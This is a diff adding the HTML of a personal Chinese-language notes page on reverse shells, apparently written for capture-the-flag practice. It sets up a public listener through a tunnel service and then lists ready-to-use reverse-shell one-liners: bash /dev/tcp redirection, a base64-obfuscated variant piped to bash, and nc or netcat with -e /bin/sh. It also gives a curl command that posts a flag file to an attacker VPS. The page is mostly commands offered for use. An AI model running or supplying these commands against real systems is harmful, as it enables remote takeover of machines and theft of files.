@@ -1,0 +1,130 @@
+<!doctype html><html lang=en dir=ltr><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content='
+  正向链接
+  #
+
+攻击者连接目标机器，如远程桌面，web服务，ssh等
+
+  反向连接
+  #
+
+相当于角色反转，让目标机器来找我们，为什么要这样做呢
+常见于命令不回显，受限于防火墙等
+反弹shell,让目标机器来找我们，就得要有一个公网ip
+我们用ngrok.cc送的，可以免费用一个公网端口
+./sunny clientid 204616381952
+
+
+free.idcfengye.com:10189
+本地映射1234d端口，监听
+nc -lvp 1234
+
+  常见的方式
+  #
+
+
+
+
+bash -i >& /dev/tcp/ip/port 0>&amp;1
+
+or
+
+bash -c "bash -i >& /dev/tcp/ip/port 0>&amp;1"#更稳定
+
+or
+
+echo "bash -i >& /dev/tcp/192.168.0.112/1234 0>&amp;1" | bash
+
+or
+
+bash -i >& /dev/tcp/111.111.111.111/7015 0>&amp;1
+#对上面进行base64编码=>YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTEuMTExLjExMS4xMTEvNzAxNSAwPiYx
+bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTEuMTExLjExMS4xMTEvNzAxNSAwPiYx}|{base64,-d}|{bash,-i}
+解释
+
+  
+      
+          命令
+          详解
+      
+  
+  
+      
+          bash -i
+          产生一个bash交互环境
+      
+      
+          >&
+          将联合符号前面的内容与后面相结合，然后一起重定向给后者。这样在被攻击机上就不会显示执行的命令
+      
+      
+          /dev/tcp/47.xxx.xxx.72/2333
+          Linux环境中所有的内容都是以文件的形式存在的，就是让目标主机与攻击机47.xxx.xxx.72的2333端口建立一个tcp连接。
+      
+      
+          0>&amp;1
+          将标准输入与标准输出的内容相结合，然后重定向给前面标准输出的内容
+      
+  
+
+
+
+
+curl http://vps:7015 -d @/flag
+-d参数时post
+@后面时这个文件'><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="http://localhost:1313/docs/network-security/other/%E5%8F%8D%E5%BC%B9shll/"><meta property="og:site_name" content="Alex lan"><meta property="og:title" content="反弹shell"><meta property="og:description" content='正向链接#攻击者连接目标机器，如远程桌面，web服务，ssh等
+反向连接#相当于角色反转，让目标机器来找我们，为什么要这样做呢
+常见于命令不回显，受限于防火墙等
+反弹shell,让目标机器来找我们，就得要有一个公网ip
+我们用ngrok.cc送的，可以免费用一个公网端口
+./sunny clientid 204616381952 free.idcfengye.com:10189 本地映射1234d端口，监听
+nc -lvp 1234 常见的方式#bash -i >& /dev/tcp/ip/port 0>&amp;1 or bash -c "bash -i >& /dev/tcp/ip/port 0>&amp;1"#更稳定 or echo "bash -i >& /dev/tcp/192.168.0.112/1234 0>&amp;1" | bash or bash -i >& /dev/tcp/111.111.111.111/7015 0>&amp;1 #对上面进行base64编码=>YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTEuMTExLjExMS4xMTEvNzAxNSAwPiYx bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTEuMTExLjExMS4xMTEvNzAxNSAwPiYx}|{base64,-d}|{bash,-i} 解释
+命令 详解 bash -i 产生一个bash交互环境 >& 将联合符号前面的内容与后面相结合，然后一起重定向给后者。这样在被攻击机上就不会显示执行的命令 /dev/tcp/47.xxx.xxx.72/2333 Linux环境中所有的内容都是以文件的形式存在的，就是让目标主机与攻击机47.xxx.xxx.72的2333端口建立一个tcp连接。 0>&amp;1 将标准输入与标准输出的内容相结合，然后重定向给前面标准输出的内容 curl http://vps:7015 -d @/flag -d参数时post
+@后面时这个文件'><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="docs"><meta property="article:published_time" content="2024-12-08T14:03:24+08:00"><meta property="article:modified_time" content="2024-12-08T14:03:24+08:00"><meta property="article:tag" content="网络安全"><title>反弹shell | Alex lan</title>
+<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=http://localhost:1313/docs/network-security/other/%E5%8F%8D%E5%BC%B9shll/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.c290d52f387bc8e8a0bd57b2126cae6de6c478944752e1d9608ba90f1c1a9220.js integrity="sha256-wpDVLzh7yOigvVeyEmyubebEeJRHUuHZYIupDxwakiA=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
+<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>Alex lan</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script><ul><li><input type=checkbox id=section-867144600acf9658ad1e030dba887392 class=toggle>
+<label for=section-867144600acf9658ad1e030dba887392 class="flex justify-between"><a role=button>code</a></label><ul><li><input type=checkbox id=section-bad47914f28bea05b9a99cdd87cd69fb class=toggle>
+<label for=section-bad47914f28bea05b9a99cdd87cd69fb class="flex justify-between"><a role=button>Android</a></label><ul><li><a href=/docs/code/android/ui/>Android ui</a></li><li><a href=/docs/code/android/%E5%8D%8F%E7%A8%8B-retrofit/>Android 协程-retrofit</a></li><li><a href=/docs/code/android/%E6%AF%94%E8%B5%9B/>Android 比赛</a></li><li><a href=/docs/code/android/2024%E5%B9%B4-%E6%96%B0/%E7%A2%8E%E7%A2%8E%E5%BF%B5/>android 碎念</a></li><li><a href=/docs/code/android/%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82/>Android 网络请求</a></li><li><a href=/docs/code/android/2024%E5%B9%B4-%E6%96%B0/%E9%80%82%E9%85%8D%E5%99%A8/>Android 适配器</a></li><li><a href=/docs/code/android/2024%E5%B9%B4-%E6%96%B0/%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82/>Android-网络请求</a></li></ul></li><li><input type=checkbox id=section-4c67168a533057d7cb02259caca8884d class=toggle>
+<label for=section-4c67168a533057d7cb02259caca8884d class="flex justify-between"><a role=button>linux</a></label><ul><li><a href=/docs/code/linux/screen/>linux screen</a></li></ul></li><li><input type=checkbox id=section-227bbb535145acab9a03ddf223110bf7 class=toggle>
+<label for=section-227bbb535145acab9a03ddf223110bf7 class="flex justify-between"><a role=button>鸿蒙</a></label><ul><li><a href=/docs/code/harmony/tabbar/>鸿蒙开发-TbaBar</a></li><li><a href=/docs/code/harmony/%E5%85%A5%E9%97%A8/>鸿蒙开发-入门</a></li><li><a href=/docs/code/harmony/%E7%8A%B6%E6%80%81%E7%AE%A1%E7%90%86/>鸿蒙开发-状态管理</a></li><li><a href=/docs/code/harmony/%E7%BD%91%E7%BB%9C/>鸿蒙开发-网络请求</a></li></ul></li><li><input type=checkbox id=section-2fdeba3d7ff97db6bc8b47fcb3b9c1c7 class=toggle>
+<label for=section-2fdeba3d7ff97db6bc8b47fcb3b9c1c7 class="flex justify-between"><a role=button>ee</a></label><ul><li><a href=/docs/code/new/autotakepic_flask/>Auto Take Pic Flask</a></li><li><a href=/docs/code/new/c_%E7%94%9C%E7%94%9C%E5%9C%88/>C 甜甜圈</a></li><li><a href=/docs/code/new/rust/%E6%9F%90%E5%9B%BE/>某图</a></li><li><a href=/docs/code/new/%E4%BD%9C%E4%B8%9A2023.10.10/>作业2023.10.10</a></li><li><a href=/docs/code/new/%E6%98%9F%E4%BA%91%E5%8A%A0%E9%80%9F%E5%99%A8/>星云加速器</a></li><li><a href=/docs/code/new/%E6%9C%A8%E9%A9%AC%E7%99%BB%E9%99%86/>木马登陆</a></li><li><a href=/docs/code/new/%E6%9F%90update/>某update</a></li><li><a href=/docs/code/new/%E6%9F%90%E5%88%B7%E8%AF%BE/>某刷课</a></li><li><a href=/docs/code/new/%E6%9F%90%E6%B4%97%E8%A1%A3%E5%B0%8F%E7%A8%8B%E5%BA%8F/>某洗衣小程序</a></li><li><a href=/docs/code/new/%E9%82%A3%E4%BA%9B%E9%AA%9A%E6%93%8D%E4%BD%9C/>那些骚操作</a></li></ul></li><li><a href=/docs/code/arch-linux/>arch linux</a></li><li><a href=/docs/code/avaloniaui/>avaloniaui</a></li><li><a href=/docs/code/c%23/>c#</a></li><li><a href=/docs/code/java_mysql/>Java_mysql</a></li><li><a href=/docs/code/linux%E7%9F%A5%E8%AF%86/>linux知识</a></li><li><a href=/docs/code/mqtt--%E4%B8%B2%E5%8F%A3--4055/>MQTT && 串口</a></li><li><a href=/docs/code/python/>Python</a></li><li><a href=/docs/code/rust/>rust</a></li><li><a href=/docs/code/cmd/>Cmd</a></li><li><a href=/docs/code/dart/>Dart</a></li><li><a href=/docs/code/%E6%95%B0%E6%8D%AE%E5%BA%93/>数据库</a></li></ul></li><li><input type=checkbox id=section-a88931adc275b5db7ba2257eca8098f2 class=toggle>
+<label for=section-a88931adc275b5db7ba2257eca8098f2 class="flex justify-between"><a role=button>e .wp</a></label><ul><li><a href=/docs/wp/bili_22_1024/>bili_22_1024</a></li><li><a href=/docs/wp/love_math/>LOVE_math</a></li><li><a href=/docs/wp/webexercise/ruby_cookie/>ruby_cookie</a></li></ul></li><li><input type=checkbox id=section-d633b3f91ad6faec5e15f38ac64d5024 class=toggle>
+<label for=section-d633b3f91ad6faec5e15f38ac64d5024 class="flex justify-between"><a role=button>good good study</a></label><ul><li><input type=checkbox id=section-ad1d0d6744ceb9d7276a26afbd49c97f class=toggle>
+<label for=section-ad1d0d6744ceb9d7276a26afbd49c97f class="flex justify-between"><a role=button>class notes</a></label><ul><li><a href=/docs/learm/%E4%B8%8A%E8%AF%BE/java/>java</a></li><li><a href=/docs/learm/%E4%B8%8A%E8%AF%BE/linux/>linux</a></li><li><a href=/docs/learm/%E4%B8%8A%E8%AF%BE/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/>信息安全</a></li><li><a href=/docs/learm/%E4%B8%8A%E8%AF%BE/%E5%B1%80%E5%9F%9F%E7%BD%91-%E6%80%9D%E7%A7%91-pt/>局域网 思科 pt</a></li><li><a href=/docs/learm/%E4%B8%8A%E8%AF%BE/%E7%AE%97%E6%B3%95%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%94%E8%AE%B0/>算法与数据结构笔记</a></li><li><a href=/docs/learm/%E4%B8%8A%E8%AF%BE/%E7%BD%91%E9%A1%B5%E5%88%B6%E4%BD%9C/>网页制作</a></li></ul></li><li><input type=checkbox id=section-297a8c491188fdc1e4d5049993bd118b class=toggle>
+<label for=section-297a8c491188fdc1e4d5049993bd118b class="flex justify-between"><a role=button>english</a></label><ul><li><a href=/docs/learm/english/%E4%B8%80%E8%88%AC%E7%8E%B0%E5%9C%A8%E6%97%B6/>一般现在时</a></li><li><a href=/docs/learm/english/%E7%8E%B0%E5%9C%A8%E8%BF%9B%E8%A1%8C%E6%97%B6/>现在进行时</a></li></ul></li><li><input type=checkbox id=section-d273ec3342c86bd09d8e0a595cc7603e class=toggle>
+<label for=section-d273ec3342c86bd09d8e0a595cc7603e class="flex justify-between"><a role=button>math</a></label><ul><li><a href=/docs/learm/math/%E5%85%AC%E5%BC%8F%E6%B5%8B%E8%AF%95/>公式测试</a></li><li><a href=/docs/learm/math/%E5%9F%BA%E6%9C%AC%E7%A7%AF%E5%88%86/>基本积分</a></li><li><a href=/docs/learm/math/%E5%AF%BC%E6%95%B0/>导数</a></li><li><a href=/docs/learm/math/%E6%95%B0%E5%88%97/>数列</a></li><li><a href=/docs/learm/math/%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F%E6%B5%8B%E8%AF%95/>数学公式测试</a></li><li><a href=/docs/learm/math/%E6%B3%B0%E5%8B%92%E5%85%AC%E5%BC%8F/>泰勒公式</a></li><li><a href=/docs/learm/math/%E7%AD%89%E4%BB%B7%E6%97%A0%E7%A9%B7%E5%B0%8F/>等价无穷小</a></li><li><a href=/docs/learm/math/%E9%B8%A1%E6%9D%82%E5%85%AC%E5%BC%8F/>鸡杂公式</a></li></ul></li></ul></li><li><input type=checkbox id=section-bc5bfc4ab3726cdac08770524fbd5e52 class=toggle>
+<label for=section-bc5bfc4ab3726cdac08770524fbd5e52 class="flex justify-between"><a role=button>hack</a></label><ul><li><a href=/docs/hack/msf/>msf</a></li><li><a href=/docs/hack/thefatrat/>TheFatRat</a></li></ul></li><li><input type=checkbox id=section-c809dbac7a9b531c0deb3f94bb3a5eb9 class=toggle>
+<label for=section-c809dbac7a9b531c0deb3f94bb3a5eb9 class="flex justify-between"><a href=/docs/re/>re</a></label><ul><li><input type=checkbox id=section-59835f29e02875febbf77853a8373c43 class=toggle>
+<label for=section-59835f29e02875febbf77853a8373c43 class="flex justify-between"><a href=/docs/re/new/>demo</a></label><ul><li><a href=/docs/re/new/%E6%9F%90h%E8%A7%86%E9%A2%91%E8%BD%AF%E4%BB%B6/>Android 比赛</a></li><li><a href=/docs/re/new/u%E5%87%80/>u净</a></li><li><a href=/docs/re/new/%E5%A4%A7%E5%AD%A6%E6%90%9C%E9%A2%98%E9%85%B1/>大学搜题</a></li><li><a href=/docs/re/new/%E5%B1%B1%E8%A5%BF%E6%81%92%E5%AE%89%E5%88%B7%E8%AF%BE%E4%BB%A5%E5%8F%8A%E8%80%83%E8%AF%95/>山西恒安刷课以及考试</a></li><li><a href=/docs/re/new/%E6%9F%90h%E8%BD%AF%E4%BB%B6/>某h软件</a></li><li><a href=/docs/re/new/bika/>某h软件 bika</a></li><li><a href=/docs/re/new/%E6%9F%90h%E8%BD%AF%E4%BB%B6-2/>某h软件-2</a></li><li><a href=/docs/re/new/%E6%B7%98%E9%87%91%E7%A4%BE%E5%8C%BA%E7%99%BB%E9%99%86/>淘金社区登陆</a></li><li><a href=/docs/re/new/%E7%88%B1%E5%A4%9A%E5%A4%9A-%E5%88%86%E6%9E%90/>爱多多 分析</a></li><li><a href=/docs/re/new/%E7%A5%9E%E5%9B%BE%E5%A3%81%E7%BA%B8/>神图壁纸</a></li></ul></li><li><a href=/docs/re/arm%E6%B1%87%E7%BC%96/>arm 汇编</a></li><li><a href=/docs/re/flutter---blutter/>flutter - blutter</a></li><li><a href=/docs/re/flutter/>flutter 初探</a></li><li><a href=/docs/re/frida/>frida</a></li><li><a href=/docs/re/ida%E5%8A%A8%E8%B0%83so/>ida 动态调试so</a></li><li><a href=/docs/re/%E5%8F%8D%E7%BC%96%E8%AF%91/>反编译</a></li><li><a href=/docs/re/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E9%80%86%E5%90%91/>小程序 逆向</a></li></ul></li><li><input type=checkbox id=section-18930a98ed98865a0f74f8bc6e5f9129 class=toggle checked>
+<label for=section-18930a98ed98865a0f74f8bc6e5f9129 class="flex justify-between"><a role=button>网络安全</a></label><ul><li><input type=checkbox id=section-651b79d602e2b6fd9e11ffc5f6867235 class=toggle>
+<label for=section-651b79d602e2b6fd9e11ffc5f6867235 class="flex justify-between"><a role=button>java</a></label><ul><li><a href=/docs/network-security/java/sql%E6%B3%A8%E5%85%A5/>java sql 注入</a></li><li><a href=/docs/network-security/java/web-inf%E8%AF%BB%E5%8F%96/>WEB-INF 读取</a></li><li><a href=/docs/network-security/java/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/>反序列化</a></li></ul></li><li><input type=checkbox id=section-a44367811822bf6f468461f4b263fc52 class=toggle>
+<label for=section-a44367811822bf6f468461f4b263fc52 class="flex justify-between"><a role=button>node</a></label><ul><li><a href=/docs/network-security/node/%E5%8E%9F%E5%BD%A2%E9%93%BE%E6%B1%A1%E6%9F%93/>node 原型链污染</a></li></ul></li><li><input type=checkbox id=section-5570b5f99c5f18ce1f4fb2ef69fe9001 class=toggle checked>
+<label for=section-5570b5f99c5f18ce1f4fb2ef69fe9001 class="flex justify-between"><a role=button>other</a></label><ul><li><a href=/docs/network-security/other/linux/>linux 知识点</a></li><li><a href=/docs/network-security/other/xpath%E6%B3%A8%E5%85%A5/>xpath 注入</a></li><li><a href=/docs/network-security/other/xxe/>XXE</a></li><li><a href=/docs/network-security/other/%E5%8F%8D%E5%BC%B9shll/ class=active>反弹shell</a></li><li><a href=/docs/network-security/other/%E7%AB%AF%E5%8F%A3/>常见端口</a></li></ul></li><li><input type=checkbox id=section-40d2a42f189bda5f49dc4cec9d080122 class=toggle>
+<label for=section-40d2a42f189bda5f49dc4cec9d080122 class="flex justify-between"><a role=button>php</a></label><ul><li><a href=/docs/network-security/php/php/>php</a></li><li><a href=/docs/network-security/php/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/>php</a></li><li><a href=/docs/network-security/php/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Clinux%E7%BB%95%E8%BF%87/>php命令执行linux绕过</a></li><li><a href=/docs/network-security/php/readflag/>readflag</a></li><li><a href=/docs/network-security/php/sql%E6%B3%A8%E5%85%A5/regexp%E7%9B%B2%E6%B3%A8/>regexp盲注</a></li><li><a href=/docs/network-security/php/session%E4%BC%AA%E9%80%A0/>session伪造</a></li><li><a href=/docs/network-security/php/sql%E6%B3%A8%E5%85%A5/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/>堆叠注入</a></li><li><a href=/docs/network-security/php/sql%E6%B3%A8%E5%85%A5/%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5/>字符型注入</a></li><li><a href=/docs/network-security/php/sql%E6%B3%A8%E5%85%A5/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/>报错注入</a></li><li><a href=/docs/network-security/php/sql%E6%B3%A8%E5%85%A5/%E6%95%B4%E5%9E%8B%E6%B3%A8%E5%85%A5/>整型注入</a></li><li><a href=/docs/network-security/php/sql%E6%B3%A8%E5%85%A5/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/>时间注入</a></li><li><a href=/docs/network-security/php/sql%E6%B3%A8%E5%85%A5/%E7%9B%B2%E6%B3%A8/>盲注</a></li><li><a href=/docs/network-security/php/htaccess%E7%9A%84%E5%88%A9%E7%94%A8/>Htaccess的利用</a></li><li><a href=/docs/network-security/php/md5%E7%A2%B0%E6%92%9E/>Md5碰撞</a></li><li><a href=/docs/network-security/php/%E4%BC%AA%E5%8D%8F%E8%AE%AE/>伪协议</a></li><li><a href=/docs/network-security/php/%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/>函数漏洞</a></li><li><a href=/docs/network-security/php/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/>文件上传</a></li><li><a href=/docs/network-security/php/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/>文件包含</a></li></ul></li><li><input type=checkbox id=section-00e8dd07f7030a556feb24211f954773 class=toggle>
+<label for=section-00e8dd07f7030a556feb24211f954773 class="flex justify-between"><a role=button>python</a></label><ul><li><a href=/docs/network-security/python/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/>pickle反序列化</a></li><li><a href=/docs/network-security/python/python-session%E4%BC%AA%E9%80%A0/>python session伪造</a></li><li><a href=/docs/network-security/python/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/>SSTI模板注入</a></li></ul></li><li><input type=checkbox id=section-e32c44d2f36aa533e1dcd6f636ecb361 class=toggle>
+<label for=section-e32c44d2f36aa533e1dcd6f636ecb361 class="flex justify-between"><a role=button>tools</a></label><ul><li><a href=/docs/network-security/tools/fake-mysql/>fake-mysql</a></li></ul></li></ul></li></ul><ul><li><a href=/posts/>Blog</a></li></ul></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>反弹shell</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><a href=#正向链接>正向链接</a></li><li><a href=#反向连接>反向连接</a></li><li><a href=#常见的方式>常见的方式</a></li></ul></nav></aside></header><article class="markdown book-article"><h2 id=正向链接>正向链接
+<a class=anchor href=#%e6%ad%a3%e5%90%91%e9%93%be%e6%8e%a5>#</a></h2><p>攻击者连接目标机器，如远程桌面，web服务，ssh等</p><h2 id=反向连接>反向连接
+<a class=anchor href=#%e5%8f%8d%e5%90%91%e8%bf%9e%e6%8e%a5>#</a></h2><p>相当于角色反转，让目标机器来找我们，为什么要这样做呢</p><p>常见于命令不回显，受限于防火墙等</p><p>反弹shell,让目标机器来找我们，就得要有一个公网ip</p><p>我们用ngrok.cc送的，可以免费用一个公网端口</p><pre tabindex=0><code>./sunny clientid 204616381952
+
+
+free.idcfengye.com:10189
+</code></pre><p>本地映射1234d端口，监听</p><pre tabindex=0><code>nc -lvp 1234
+</code></pre><h2 id=常见的方式>常见的方式
+<a class=anchor href=#%e5%b8%b8%e8%a7%81%e7%9a%84%e6%96%b9%e5%bc%8f>#</a></h2><ul><li></li></ul><pre tabindex=0><code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1
+
+or
+
+bash -c &#34;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#34;#更稳定
+
+or
+
+echo &#34;bash -i &gt;&amp; /dev/tcp/192.168.0.112/1234 0&gt;&amp;1&#34; | bash
+
+or
+
+bash -i &gt;&amp; /dev/tcp/111.111.111.111/7015 0&gt;&amp;1
+#对上面进行base64编码=&gt;YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTEuMTExLjExMS4xMTEvNzAxNSAwPiYx
+bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTEuMTExLjExMS4xMTEvNzAxNSAwPiYx}|{base64,-d}|{bash,-i}
+</code></pre><p>解释</p><table><thead><tr><th>命令</th><th>详解</th></tr></thead><tbody><tr><td>bash -i</td><td>产生一个bash交互环境</td></tr><tr><td>>&</td><td>将联合符号前面的内容与后面相结合，然后一起重定向给后者。这样在被攻击机上就不会显示执行的命令</td></tr><tr><td>/dev/tcp/47.xxx.xxx.72/2333</td><td>Linux环境中所有的内容都是以文件的形式存在的，就是让目标主机与攻击机47.xxx.xxx.72的2333端口建立一个tcp连接。</td></tr><tr><td>0>&amp;1</td><td>将标准输入与标准输出的内容相结合，然后重定向给前面标准输出的内容</td></tr></tbody></table><ul><li></li></ul><pre tabindex=0><code>curl http://vps:7015 -d @/flag
+</code></pre><p>-d参数时post</p><p>@后面时这个文件</p><p>本地监听就能看到请求的flag</p><ul><li></li></ul><pre tabindex=0><code>nc -e /bin/sh 192.168.146.129 2333
+</code></pre><ul><li><p>主要就是上面这些</p><pre tabindex=0><code>netcat 47.xxx.xxx.72 2333 -e /bin/bash
+</code></pre></li></ul></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><a href=#正向链接>正向链接</a></li><li><a href=#反向连接>反向连接</a></li><li><a href=#常见的方式>常见的方式</a></li></ul></nav></div></aside></main></body></html>
